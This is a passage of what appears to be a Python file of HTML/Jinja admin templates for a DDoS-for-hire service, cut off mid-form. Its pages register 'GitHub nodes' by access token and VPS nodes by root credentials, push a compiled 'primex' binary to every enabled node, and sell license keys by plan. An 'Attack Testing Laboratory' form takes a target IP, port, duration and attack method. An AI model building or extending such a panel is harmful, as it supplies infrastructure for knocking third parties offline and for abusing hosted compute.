.add-grid {
  display: grid; grid-template-columns: 1fr 1fr; gap: 20px;
  margin-bottom: 24px;
  animation: fadeUp 0.6s ease 0.1s both;
}
@keyframes fadeUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }

/* Cards */
.panel {
  background: var(--surface);
  backdrop-filter: blur(18px); -webkit-backdrop-filter: blur(18px);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  overflow: hidden;
}
.panel-header {
  padding: 14px 20px;
  background: rgba(255,40,100,0.07);
  border-bottom: 1px solid var(--border);
  font-family: 'Orbitron', monospace;
  font-size: 12px; font-weight: 700; letter-spacing: 1.5px;
  text-transform: uppercase; color: var(--accent2);
  display: flex; align-items: center; gap: 8px;
}
.panel-body { padding: 24px; }

/* Form elements */
.field { margin-bottom: 14px; }
.field label {
  display: block; font-size: 11px; font-weight: 700;
  letter-spacing: 1px; text-transform: uppercase;
  color: var(--muted); margin-bottom: 6px;
}
.form-input {
  width: 100%;
  background: rgba(0,0,0,0.45);
  border: 1px solid rgba(255,255,255,0.07);
  border-radius: 10px;
  padding: 11px 16px;
  color: var(--text);
  font-family: 'Rajdhani', sans-serif;
  font-size: 14px; font-weight: 500;
  outline: none;
  transition: all 0.2s;
}
.form-input::placeholder { color: rgba(220,170,185,0.25); }
.form-input:focus {
  border-color: var(--accent);
  box-shadow: 0 0 0 3px rgba(255,40,100,0.1);
  background: rgba(255,40,100,0.03);
}
input[type="file"].form-input { padding: 9px 14px; cursor: pointer; }

/* Checkbox */
.check-row {
  display: flex; align-items: center; gap: 10px;
  padding: 10px 0;
}
.check-row input[type="checkbox"] {
  width: 18px; height: 18px; accent-color: var(--accent);
  cursor: pointer; flex-shrink: 0;
}
.check-row label { font-size: 14px; font-weight: 600; color: var(--muted); cursor: pointer; }

/* Buttons */
.btn {
  display: inline-flex; align-items: center; gap: 8px;
  padding: 11px 22px; border: none; border-radius: 10px;
  font-family: 'Orbitron', monospace; font-size: 11px;
  font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase;
  cursor: pointer; transition: all 0.22s ease;
  text-decoration: none; white-space: nowrap;
}
.btn-primary {
  background: linear-gradient(135deg, var(--accent), #cc2255);
  color: #fff;
  box-shadow: 0 4px 16px rgba(255,40,100,0.25);
}
.btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(255,40,100,0.4); }

.btn-warning {
  background: linear-gradient(135deg, #ffaa00, #ff7700);
  color: #0a0200;
  box-shadow: 0 4px 14px rgba(255,160,0,0.2);
}
.btn-warning:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(255,160,0,0.35); }

.btn-sm {
  padding: 6px 14px; font-size: 10px; letter-spacing: 1px;
  border-radius: 8px;
}
.btn-info    { background: rgba(0,170,255,0.15); border: 1px solid rgba(0,170,255,0.3); color: var(--blue); }
.btn-info:hover { background: rgba(0,170,255,0.25); transform: translateY(-1px); }
.btn-toggle  { background: rgba(255,200,0,0.12); border: 1px solid rgba(255,200,0,0.25); color: var(--yellow); }
.btn-toggle:hover { background: rgba(255,200,0,0.22); transform: translateY(-1px); }
.btn-danger  { background: rgba(255,40,100,0.12); border: 1px solid rgba(255,40,100,0.3); color: var(--accent2); }
.btn-danger:hover { background: rgba(255,40,100,0.22); transform: translateY(-1px); }

/* Binary upload panel */
.binary-panel {
  animation: fadeUp 0.6s ease 0.2s both;
  margin-bottom: 24px;
}
.binary-row {
  display: flex; align-items: flex-end; gap: 14px; flex-wrap: wrap;
}
.binary-row .field { flex: 1; min-width: 200px; margin-bottom: 0; }
.binary-note { font-size: 12px; color: var(--muted); margin-top: 10px; display: flex; align-items: center; gap: 6px; }

/* Table */
.table-panel { animation: fadeUp 0.6s ease 0.3s both; }
.table-wrap { overflow-x: auto; }

table {
  width: 100%; border-collapse: collapse;
}
thead tr {
  background: rgba(255,40,100,0.06);
  border-bottom: 1px solid var(--border);
}
th {
  padding: 12px 16px;
  font-family: 'Orbitron', monospace;
  font-size: 10px; font-weight: 700; letter-spacing: 1.5px;
  text-transform: uppercase; color: var(--muted);
  white-space: nowrap; text-align: left;
}
td {
  padding: 14px 16px;
  font-size: 14px; font-weight: 500;
  border-bottom: 1px solid rgba(255,255,255,0.04);
  vertical-align: middle;
}
tbody tr { transition: background 0.2s; }
tbody tr:hover { background: rgba(255,40,100,0.04); }
tbody tr:last-child td { border-bottom: none; }

/* Status badges */
.status-badge {
  display: inline-flex; align-items: center; gap: 6px;
  padding: 4px 10px; border-radius: 20px;
  font-size: 11px; font-weight: 700; letter-spacing: 0.5px;
}
.status-online  { background: rgba(0,255,170,0.1);  border: 1px solid rgba(0,255,170,0.25); color: var(--green); }
.status-offline { background: rgba(255,40,100,0.1); border: 1px solid rgba(255,40,100,0.25); color: var(--accent2); }
.status-unknown { background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1); color: var(--muted); }
.status-dot { width: 6px; height: 6px; border-radius: 50%; }
.status-online  .status-dot { background: var(--green); box-shadow: 0 0 6px var(--green); animation: blink 2s ease infinite; }
.status-offline .status-dot { background: var(--accent); }
.status-unknown .status-dot { background: rgba(255,255,255,0.3); }

/* Type pill */
.type-pill {
  display: inline-block;
  padding: 3px 10px; border-radius: 6px;
  font-size: 11px; font-weight: 700; letter-spacing: 1px;
  text-transform: uppercase;
}
.type-github { background: rgba(0,170,255,0.1); border:1px solid rgba(0,170,255,0.2); color: var(--blue); }
.type-vps    { background: rgba(255,200,0,0.1);  border:1px solid rgba(255,200,0,0.2);  color: var(--yellow); }

/* Enabled icon */
.icon-yes { color: var(--green); font-size: 15px; }
.icon-no  { color: var(--accent); font-size: 15px; }

/* Binary icon */
.bin-yes { color: var(--green); }
.bin-no  { color: var(--accent2); }

/* Action group */
.action-group { display: flex; align-items: center; gap: 6px; flex-wrap: wrap; }
.action-group form { display: inline; }

/* Empty state */
.empty-state {
  text-align: center; padding: 48px 20px;
  color: var(--muted); font-size: 15px;
}
.empty-icon { font-size: 40px; margin-bottom: 12px; opacity: 0.4; }

/* Responsive */
@media (max-width: 768px) {
  .add-grid { grid-template-columns: 1fr; }
  .binary-row { flex-direction: column; }
  .topbar { flex-direction: column; align-items: flex-start; }
}
</style>
</head>
<body>

<div class="bg-grid"></div>
<div class="orb orb-1"></div>
<div class="orb orb-2"></div>

<div class="container">

  <!-- Topbar -->
  <div class="topbar">
    <a href="/admin/dashboard" class="back-btn"><i class="fas fa-arrow-left"></i> Dashboard</a>
    <h1 class="page-title">Node Management</h1>
    <div class="admin-badge"><div class="badge-dot"></div> Admin Panel</div>
  </div>

  <!-- Add Nodes -->
  <div class="section-title"><i class="fas fa-plus-circle"></i> Add Node</div>
  <div class="add-grid">

    <!-- GitHub Node -->
    <div class="panel">
      <div class="panel-header"><i class="fab fa-github"></i> GitHub Node</div>
      <div class="panel-body">
        <form method="POST" action="/admin/nodes/add_github">
          <div class="field">
            <label>Node Name</label>
            <input type="text" name="name" class="form-input" placeholder="e.g. gh-node-01" required>
          </div>
          <div class="field">
            <label>GitHub Token</label>
            <input type="text" name="github_token" class="form-input" placeholder="ghp_xxxxxxxxxxxx" required>
          </div>
          <div class="field">
            <label>Repository Name</label>
            <input type="text" name="github_repo" class="form-input" placeholder="InfernoCore (default)">
          </div>
          <div class="check-row">
            <input type="checkbox" name="enabled" id="gh-enabled" checked>
            <label for="gh-enabled">Enable immediately</label>
          </div>
          <div style="margin-top:16px;">
            <button type="submit" class="btn btn-primary"><i class="fab fa-github"></i> Add GitHub Node</button>
          </div>
        </form>
      </div>
    </div>

    <!-- VPS Node -->
    <div class="panel">
      <div class="panel-header"><i class="fas fa-server"></i> VPS Node</div>
      <div class="panel-body">
        <form method="POST" action="/admin/nodes/add_vps" enctype="multipart/form-data">
          <div class="field">
            <label>Node Name</label>
            <input type="text" name="name" class="form-input" placeholder="e.g. vps-node-01" required>
          </div>
          <div style="display:grid; grid-template-columns:1fr auto; gap:12px;">
            <div class="field">
              <label>VPS Host / IP</label>
              <input type="text" name="vps_host" class="form-input" placeholder="192.168.1.100" required>
            </div>
            <div class="field">
              <label>Port</label>
              <input type="number" name="vps_port" class="form-input" value="22" style="width:80px;">
            </div>
          </div>
          <div class="field">
            <label>Username</label>
            <input type="text" name="vps_username" class="form-input" placeholder="root" required>
          </div>
          <div class="field">
            <label>Password</label>
            <input type="password" name="vps_password" class="form-input" placeholder="Leave empty to use SSH key">
          </div>
          <div class="field">
            <label>SSH Private Key (.pem / .key) — optional</label>
            <input type="file" name="vps_key_file" class="form-input" accept=".pem,.key">
          </div>
          <div class="check-row">
            <input type="checkbox" name="enabled" id="vps-enabled" checked>
            <label for="vps-enabled">Enable immediately</label>
          </div>
          <div style="margin-top:16px;">
            <button type="submit" class="btn btn-primary"><i class="fas fa-server"></i> Add VPS Node</button>
          </div>
        </form>
      </div>
    </div>

  </div>

  <!-- Binary Upload -->
  <div class="section-title"><i class="fas fa-upload"></i> Binary Distribution</div>
  <div class="panel binary-panel">
    <div class="panel-header"><i class="fas fa-microchip"></i> Distribute Binary (primex)</div>
    <div class="panel-body">
      <form method="POST" action="/admin/upload_binary" enctype="multipart/form-data">
        <div class="binary-row">
          <div class="field">
            <label>Select compiled binary</label>
            <input type="file" name="binary" class="form-input" required>
          </div>
          <button type="submit" class="btn btn-warning"><i class="fas fa-rocket"></i> Upload & Distribute</button>
        </div>
        <div class="binary-note">
          <i class="fas fa-info-circle"></i>
          Upload the compiled <code style="background:rgba(255,255,255,0.08);padding:2px 6px;border-radius:4px;font-size:11px;">primex</code> binary. It will be pushed to all enabled nodes automatically.
        </div>
      </form>
    </div>
  </div>

  <!-- Nodes Table -->
  <div class="section-title"><i class="fas fa-network-wired"></i> Active Nodes</div>
  <div class="panel table-panel">
    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Enabled</th>
            <th>Status</th>
            <th>Binary</th>
            <th>Details</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody>
          {% for n in nodes %}
          <tr>
            <td><strong style="color:var(--text);">{{ n.name }}</strong></td>
            <td>
              {% if n.node_type == 'github' %}
                <span class="type-pill type-github"><i class="fab fa-github"></i> GitHub</span>
              {% else %}
                <span class="type-pill type-vps"><i class="fas fa-server"></i> VPS</span>
              {% endif %}
            </td>
            <td>
              {% if n.enabled %}
                <i class="fas fa-check-circle icon-yes"></i>
              {% else %}
                <i class="fas fa-times-circle icon-no"></i>
              {% endif %}
            </td>
            <td>
              {% if n.status_detail == 'active' %}
                <span class="status-badge status-online"><span class="status-dot"></span>Active</span>
              {% elif n.status_detail == 'offline' %}
                <span class="status-badge status-offline"><span class="status-dot"></span>Offline</span>
              {% else %}
                <span class="status-badge status-unknown"><span class="status-dot"></span>{{ n.status_detail | default('Unknown') }}</span>
              {% endif %}
            </td>
            <td>
              {% if n.binary_present %}
                <i class="fas fa-check bin-yes" title="Binary present"></i>
              {% else %}
                <i class="fas fa-times bin-no" title="No binary"></i>
              {% endif %}
            </td>
            <td style="font-size:13px; color:var(--muted); font-family:'Orbitron',monospace; font-size:11px;">
              {% if n.node_type == 'github' %}
                {{ n.github_repo }}
              {% else %}
                {{ n.vps_host }}:{{ n.vps_port }}
              {% endif %}
            </td>
            <td>
              <div class="action-group">
                <form method="POST" action="/admin/nodes/{{ n.id }}/check">
                  <button type="submit" class="btn btn-sm btn-info" title="Check status"><i class="fas fa-satellite-dish"></i> Check</button>
                </form>
                <form method="POST" action="/admin/nodes/{{ n.id }}/toggle">
                  <button type="submit" class="btn btn-sm btn-toggle" title="Toggle enable/disable"><i class="fas fa-power-off"></i> Toggle</button>
                </form>
                <form method="POST" action="/admin/nodes/{{ n.id }}/delete" onsubmit="return confirm('Delete node {{ n.name }}? This cannot be undone.')">
                  <button type="submit" class="btn btn-sm btn-danger" title="Delete node"><i class="fas fa-trash"></i> Delete</button>
                </form>
              </div>
            </td>
          </tr>
          {% else %}
          <tr>
            <td colspan="7">
              <div class="empty-state">
                <div class="empty-icon">🖥️</div>
                No nodes configured yet. Add a GitHub or VPS node above.
              </div>
            </td>
          </tr>
          {% endfor %}
        </tbody>
      </table>
    </div>
  </div>

</div>
</body>
</html>
'''

ADMIN_KEYS_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
<title>Key Management • Admin</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

:root {
  --bg: #060208;
  --surface: rgba(18, 6, 16, 0.75);
  --border: rgba(255, 40, 100, 0.18);
  --border2: rgba(255,255,255,0.06);
  --accent: #ff3366;
  --accent2: #ff6680;
  --green: #00ffaa;
  --blue: #00aaff;
  --yellow: #ffcc00;
  --text: #f0d0d8;
  --muted: rgba(220,170,185,0.45);
  --radius: 20px;
}

body {
  background: var(--bg);
  font-family: 'Rajdhani', sans-serif;
  color: var(--text);
  min-height: 100vh;
  padding: 28px 20px;
  position: relative;
  overflow-x: hidden;
}

.bg-grid {
  position: fixed; inset: 0; z-index: 0; pointer-events: none;
  background-image:
    linear-gradient(rgba(255,40,100,0.025) 1px, transparent 1px),
    linear-gradient(90deg, rgba(255,40,100,0.025) 1px, transparent 1px);
  background-size: 56px 56px;
}
.orb {
  position: fixed; border-radius: 50%; filter: blur(110px);
  opacity: 0.14; pointer-events: none; z-index: 0;
  animation: drift linear infinite;
}
.orb-1 { width: 600px; height: 600px; background: radial-gradient(#ff3366, transparent 70%); top: -200px; right: -150px; animation-duration: 22s; }
.orb-2 { width: 400px; height: 400px; background: radial-gradient(#6600ff, transparent 70%); bottom: -100px; left: -100px; animation-duration: 30s; animation-direction: reverse; }
@keyframes drift {
  0%   { transform: translate(0,0) scale(1); }
  33%  { transform: translate(-30px,20px) scale(1.05); }
  66%  { transform: translate(20px,-15px) scale(0.96); }
  100% { transform: translate(0,0) scale(1); }
}

.container { position: relative; z-index: 10; max-width: 1280px; margin: 0 auto; }

/* Topbar */
.topbar {
  display: flex; align-items: center; justify-content: space-between;
  margin-bottom: 32px; flex-wrap: wrap; gap: 12px;
  animation: fadeDown 0.5s ease both;
}
@keyframes fadeDown { from { opacity:0; transform:translateY(-16px); } to { opacity:1; transform:translateY(0); } }

.back-btn {
  display: inline-flex; align-items: center; gap: 8px;
  color: var(--muted); text-decoration: none; font-size: 13px;
  font-weight: 600; letter-spacing: 1px; text-transform: uppercase;
  border: 1px solid var(--border2); border-radius: 10px; padding: 8px 16px;
  transition: all 0.2s;
}
.back-btn:hover { color: var(--accent2); border-color: var(--border); background: rgba(255,40,100,0.05); }

.page-title {
  font-family: 'Orbitron', monospace;
  font-size: 22px; font-weight: 900;
  background: linear-gradient(90deg, var(--accent), var(--accent2));
  -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
}

.admin-badge {
  display: inline-flex; align-items: center; gap: 7px;
  background: rgba(255,40,100,0.08); border: 1px solid var(--border);
  border-radius: 20px; padding: 5px 14px;
  font-size: 11px; font-weight: 700; letter-spacing: 2px;
  text-transform: uppercase; color: var(--accent2);
}
.badge-dot { width: 6px; height: 6px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 8px var(--accent); animation: blink 1.4s ease-in-out infinite; }
@keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.3;} }

/* Section headings */
.section-title {
  font-family: 'Orbitron', monospace;
  font-size: 13px; font-weight: 700; letter-spacing: 2px;
  text-transform: uppercase; color: var(--muted);
  margin-bottom: 16px; display: flex; align-items: center; gap: 10px;
}
.section-title::after { content:''; flex:1; height:1px; background:linear-gradient(90deg,var(--border),transparent); }

/* Panel */
.panel {
  background: var(--surface);
  backdrop-filter: blur(18px); -webkit-backdrop-filter: blur(18px);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  overflow: hidden;
  margin-bottom: 24px;
}
.panel-header {
  padding: 14px 20px;
  background: rgba(255,40,100,0.07);
  border-bottom: 1px solid var(--border);
  font-family: 'Orbitron', monospace;
  font-size: 12px; font-weight: 700; letter-spacing: 1.5px;
  text-transform: uppercase; color: var(--accent2);
  display: flex; align-items: center; gap: 8px;
}
.panel-body { padding: 24px; }

/* Generate form */
.gen-form {
  display: grid;
  grid-template-columns: 2fr 1fr 1fr 2fr;
  gap: 14px; align-items: end;
  animation: fadeUp 0.6s ease 0.1s both;
}
@keyframes fadeUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }

.field label {
  display: block; font-size: 11px; font-weight: 700;
  letter-spacing: 1px; text-transform: uppercase;
  color: var(--muted); margin-bottom: 7px;
}

.form-input, .form-select {
  width: 100%;
  background: rgba(0,0,0,0.45);
  border: 1px solid rgba(255,255,255,0.07);
  border-radius: 10px;
  padding: 11px 16px;
  color: var(--text);
  font-family: 'Rajdhani', sans-serif;
  font-size: 14px; font-weight: 500;
  outline: none;
  transition: all 0.2s;
  -webkit-appearance: none;
}
.form-select { cursor: pointer; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23ff6680' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 14px center; padding-right: 36px; }
.form-input::placeholder { color: rgba(220,170,185,0.25); }
.form-input:focus, .form-select:focus {
  border-color: var(--accent);
  box-shadow: 0 0 0 3px rgba(255,40,100,0.1);
  background: rgba(255,40,100,0.03);
}
.form-select option { background: #1a0a14; color: var(--text); }

.btn-generate {
  width: 100%; padding: 11px 20px;
  background: linear-gradient(135deg, var(--accent), #cc2255);
  border: none; border-radius: 10px;
  color: #fff; font-family: 'Orbitron', monospace;
  font-size: 11px; font-weight: 700; letter-spacing: 1.5px;
  text-transform: uppercase; cursor: pointer;
  transition: all 0.22s ease; display: flex;
  align-items: center; justify-content: center; gap: 8px;
  box-shadow: 0 4px 16px rgba(255,40,100,0.25);
}
.btn-generate:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(255,40,100,0.4); }
.btn-generate:active { transform: translateY(0); }

/* Stats row */
.stats-row {
  display: grid; grid-template-columns: repeat(3, 1fr); gap: 14px;
  margin-bottom: 24px;
  animation: fadeUp 0.6s ease 0.15s both;
}
.stat-card {
  background: var(--surface);
  backdrop-filter: blur(18px);
  border: 1px solid var(--border);
  border-radius: 14px; padding: 18px 20px;
  display: flex; align-items: center; gap: 14px;
}
.stat-icon {
  width: 40px; height: 40px; border-radius: 10px;
  display: flex; align-items: center; justify-content: center;
  font-size: 16px; flex-shrink: 0;
}
.stat-icon.green { background: rgba(0,255,170,0.1); border: 1px solid rgba(0,255,170,0.2); color: var(--green); }
.stat-icon.blue  { background: rgba(0,170,255,0.1); border: 1px solid rgba(0,170,255,0.2); color: var(--blue); }
.stat-icon.red   { background: rgba(255,40,100,0.1); border: 1px solid rgba(255,40,100,0.2); color: var(--accent2); }
.stat-val { font-family: 'Orbitron', monospace; font-size: 22px; font-weight: 900; color: var(--text); line-height: 1; }
.stat-label { font-size: 11px; font-weight: 600; letter-spacing: 0.5px; color: var(--muted); margin-top: 3px; text-transform: uppercase; }

/* Table */
.table-panel { animation: fadeUp 0.6s ease 0.2s both; }
.table-wrap { overflow-x: auto; }
table { width: 100%; border-collapse: collapse; }
thead tr { background: rgba(255,40,100,0.06); border-bottom: 1px solid var(--border); }
th {
  padding: 12px 16px; font-family: 'Orbitron', monospace;
  font-size: 10px; font-weight: 700; letter-spacing: 1.5px;
  text-transform: uppercase; color: var(--muted);
  white-space: nowrap; text-align: left;
}
td {
  padding: 13px 16px; font-size: 14px; font-weight: 500;
  border-bottom: 1px solid rgba(255,255,255,0.04);
  vertical-align: middle;
}
tbody tr { transition: background 0.2s; }
tbody tr:hover { background: rgba(255,40,100,0.04); }
tbody tr:last-child td { border-bottom: none; }

/* Key code */
.key-code {
  font-family: 'Orbitron', monospace; font-size: 11px;
  color: var(--accent2); letter-spacing: 1px;
  background: rgba(255,40,100,0.07);
  border: 1px solid rgba(255,40,100,0.15);
  border-radius: 6px; padding: 4px 10px;
  display: inline-block; max-width: 220px;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  cursor: pointer; transition: background 0.2s;
  vertical-align: middle;
}
.key-code:hover { background: rgba(255,40,100,0.14); }

/* Copy btn */
.copy-btn {
  background: none; border: none; cursor: pointer;
  color: var(--muted); font-size: 13px; padding: 0 0 0 6px;
  transition: color 0.2s; vertical-align: middle;
}
.copy-btn:hover { color: var(--accent2); }

/* Plan pill */
.plan-pill {
  display: inline-block; padding: 3px 10px; border-radius: 6px;
  font-size: 11px; font-weight: 700; letter-spacing: 0.8px;
  text-transform: uppercase;
  background: rgba(255,200,0,0.1); border: 1px solid rgba(255,200,0,0.2); color: var(--yellow);
}

/* Status badges */
.status-badge {
  display: inline-flex; align-items: center; gap: 5px;
  padding: 4px 10px; border-radius: 20px;
  font-size: 11px; font-weight: 700; letter-spacing: 0.5px;
}
.s-active   { background: rgba(0,255,170,0.1);  border: 1px solid rgba(0,255,170,0.25); color: var(--green); }
.s-used     { background: rgba(0,170,255,0.1);  border: 1px solid rgba(0,170,255,0.25); color: var(--blue); }
.s-inactive { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: var(--muted); }
.s-dot { width: 5px; height: 5px; border-radius: 50%; }
.s-active .s-dot   { background: var(--green); box-shadow: 0 0 5px var(--green); animation: blink 2s infinite; }
.s-used .s-dot     { background: var(--blue); }
.s-inactive .s-dot { background: rgba(255,255,255,0.3); }

/* Action button */
.btn-del {
  display: inline-flex; align-items: center; gap: 6px;
  padding: 6px 14px; border: none; border-radius: 8px;
  background: rgba(255,40,100,0.12); border: 1px solid rgba(255,40,100,0.25);
  color: var(--accent2); font-family: 'Orbitron', monospace;
  font-size: 10px; font-weight: 700; letter-spacing: 1px;
  cursor: pointer; transition: all 0.2s;
}
.btn-del:hover { background: rgba(255,40,100,0.22); transform: translateY(-1px); }

/* Empty state */
.empty-state { text-align: center; padding: 48px 20px; color: var(--muted); }
.empty-icon  { font-size: 40px; margin-bottom: 12px; opacity: 0.4; }

/* Responsive */
@media (max-width: 768px) {
  .gen-form { grid-template-columns: 1fr 1fr; }
  .stats-row { grid-template-columns: 1fr; }
  .topbar { flex-direction: column; align-items: flex-start; }
}
@media (max-width: 480px) {
  .gen-form { grid-template-columns: 1fr; }
}
</style>
</head>
<body>

<div class="bg-grid"></div>
<div class="orb orb-1"></div>
<div class="orb orb-2"></div>

<div class="container">

  <!-- Topbar -->
  <div class="topbar">
    <a href="/admin/dashboard" class="back-btn"><i class="fas fa-arrow-left"></i> Dashboard</a>
    <h1 class="page-title">Key Management</h1>
    <div class="admin-badge"><div class="badge-dot"></div> Admin Panel</div>
  </div>

  <!-- Stats -->
  <div class="stats-row">
    <div class="stat-card">
      <div class="stat-icon green"><i class="fas fa-key"></i></div>
      <div>
        <div class="stat-val">{{ keys | selectattr('active') | selectattr('used_by', 'none') | list | length }}</div>
        <div class="stat-label">Active Keys</div>
      </div>
    </div>
    <div class="stat-card">
      <div class="stat-icon blue"><i class="fas fa-check-circle"></i></div>
      <div>
        <div class="stat-val">{{ keys | selectattr('used_by') | list | length }}</div>
        <div class="stat-label">Used Keys</div>
      </div>
    </div>
    <div class="stat-card">
      <div class="stat-icon red"><i class="fas fa-layer-group"></i></div>
      <div>
        <div class="stat-val">{{ keys | length }}</div>
        <div class="stat-label">Total Keys</div>
      </div>
    </div>
  </div>

  <!-- Generate -->
  <div class="section-title"><i class="fas fa-plus-circle"></i> Generate Keys</div>
  <div class="panel" style="margin-bottom:24px; animation: fadeUp 0.6s ease 0.1s both;">
    <div class="panel-header"><i class="fas fa-magic"></i> New Key Batch</div>
    <div class="panel-body">
      <form method="POST" action="/admin/keys/generate">
        <div class="gen-form">
          <div class="field">
            <label>Plan</label>
            <select name="plan" class="form-select">
              {% for p in plans %}
              <option value="{{ p.name }}">{{ p.name }}</option>
              {% endfor %}
            </select>
          </div>
          <div class="field">
            <label>Days</label>
            <input type="number" name="days" class="form-input" placeholder="30" value="30" min="1">
          </div>
          <div class="field">
            <label>Count</label>
            <input type="number" name="count" class="form-input" placeholder="1" value="1" min="1" max="100">
          </div>
          <div class="field">
            <label>&nbsp;</label>
            <button type="submit" class="btn-generate"><i class="fas fa-plus"></i> Generate Keys</button>
          </div>
        </div>
      </form>
    </div>
  </div>

  <!-- Keys Table -->
  <div class="section-title"><i class="fas fa-list"></i> All Keys</div>
  <div class="panel table-panel">
    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>Key</th>
            <th>Plan</th>
            <th>Days</th>
            <th>Created</th>
            <th>Used By</th>
            <th>Status</th>
            <th>Action</th>
          </tr>
        </thead>
        <tbody>
          {% for k in keys %}
          <tr>
            <td>
              <span class="key-code" title="{{ k.key }}" onclick="copyKey('{{ k.key }}', this)">{{ k.key }}</span>
              <button class="copy-btn" onclick="copyKey('{{ k.key }}')" title="Copy key"><i class="fas fa-copy"></i></button>
            </td>
            <td><span class="plan-pill">{{ k.plan }}</span></td>
            <td style="font-family:'Orbitron',monospace; font-size:12px; color:var(--muted);">{{ k.duration_days }}d</td>
            <td style="font-size:13px; color:var(--muted);">{{ k.created_at.strftime('%Y-%m-%d') }}</td>
            <td style="font-size:13px;">
              {% if k.used_by %}
                <span style="color:var(--blue); font-weight:600;">{{ k.used_by }}</span>
              {% else %}
                <span style="color:rgba(255,255,255,0.2);">—</span>
              {% endif %}
            </td>
            <td>
              {% if k.active and not k.used_by %}
                <span class="status-badge s-active"><span class="s-dot"></span>Active</span>
              {% elif k.used_by %}
                <span class="status-badge s-used"><span class="s-dot"></span>Used</span>
              {% else %}
                <span class="status-badge s-inactive"><span class="s-dot"></span>Inactive</span>
              {% endif %}
            </td>
            <td>
              <form method="POST" action="/admin/keys/{{ k.id }}/delete" onsubmit="return confirm('Delete this key?')">
                <button type="submit" class="btn-del"><i class="fas fa-trash"></i> Delete</button>
              </form>
            </td>
          </tr>
          {% else %}
          <tr>
            <td colspan="7">
              <div class="empty-state">
                <div class="empty-icon">🗝️</div>
                No keys generated yet. Use the form above to create some.
              </div>
            </td>
          </tr>
          {% endfor %}
        </tbody>
      </table>
    </div>
  </div>

</div>

<script>
function copyKey(key, el) {
  navigator.clipboard.writeText(key).then(() => {
    if (el) {
      const orig = el.textContent;
      el.textContent = 'Copied!';
      el.style.color = 'var(--green)';
      setTimeout(() => { el.textContent = orig; el.style.color = ''; }, 1500);
    }
  });
}
</script>

</body>
</html>
'''

ADMIN_TEST_ATTACK_HTML = '''
<!DOCTYPE html>
<html><head><title>Test Attack • Admin</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>:root{--neon:#00ffcc;--danger:#ff3366;--warning:#ffaa00;--success:#00cc88;}
body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000);font-family:'Inter',sans-serif;color:#fff;padding:20px;}
.glass-card{background:rgba(15,25,45,0.5);backdrop-filter:blur(12px);border-radius:24px;border:1px solid rgba(0,255,200,0.15);padding:20px;margin-bottom:20px;transition:0.3s;}
.glass-card:hover{transform:translateY(-3px);border-color:rgba(0,255,200,0.4);box-shadow:0 10px 30px rgba(0,0,0,0.3);}
.btn-neon{background:linear-gradient(90deg,#00b377,#00cc88);border:none;border-radius:60px;padding:12px 24px;font-weight:bold;color:#000;}
.btn-neon:hover{transform:scale(1.02);box-shadow:0 0 15px #00ff88;}
input,select{background:rgba(0,0,0,0.5);border:1px solid #2a3a5a;border-radius:40px;padding:12px 20px;color:white;width:100%;}
.status-badge{padding:4px 10px;border-radius:40px;font-size:12px;font-weight:600;}
.status-success{background:rgba(0,204,136,0.2);color:#00cc88;border:1px solid #00cc88;}
.status-failed{background:rgba(255,51,102,0.2);color:#ff3366;border:1px solid #ff3366;}
@keyframes fadeIn{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}
</style></head>
<body><div class="container">
<div class="d-flex justify-content-between align-items-center mb-4"><h2><i class="fas fa-flask me-2" style="color:var(--neon);"></i>Attack Testing Laboratory</h2><a href="/admin/dashboard" class="btn btn-outline-light"><i class="fas fa-arrow-left"></i> Back</a></div>

<!-- Quick Test Panel -->
<div class="glass-card"><h4><i class="fas fa-bolt me-2"></i>Quick Test Configuration</h4>
<p class="text-warning"><i class="fas fa-exclamation-triangle me-1"></i> Use a safe target (e.g., 127.0.0.1 or a test server).</p>
<form method="POST">
    <div class="row g-3">
        <div class="col-md-3"><label>Target IP</label><input type="text" name="target" class="form-control bg-dark text-white" placeholder="192.168.1.1" required></div>
        <div class="col-md-2"><label>Port</label><input type="number" name="port" class="form-control bg-dark text-white" placeholder="443" required></div>
        <div class="col-md-2"><label>Duration (max 30s)</label><input type="number" name="duration" class="form-control bg-dark text-white" value="10" min="1" max="30"></div>
        <div class="col-md-3">
            <label>Method</label>
            <select name="method" class="form-select bg-dark text-white">
                {% for val, label in methods %}
                <option value="{{ val }}">{{ label }}</option>
                {% endfor %}
            </select>
        </div>
        <div class="col-md-2"><label>Mode</label>
            <select name="mode" class="form-select bg-dark text-white">
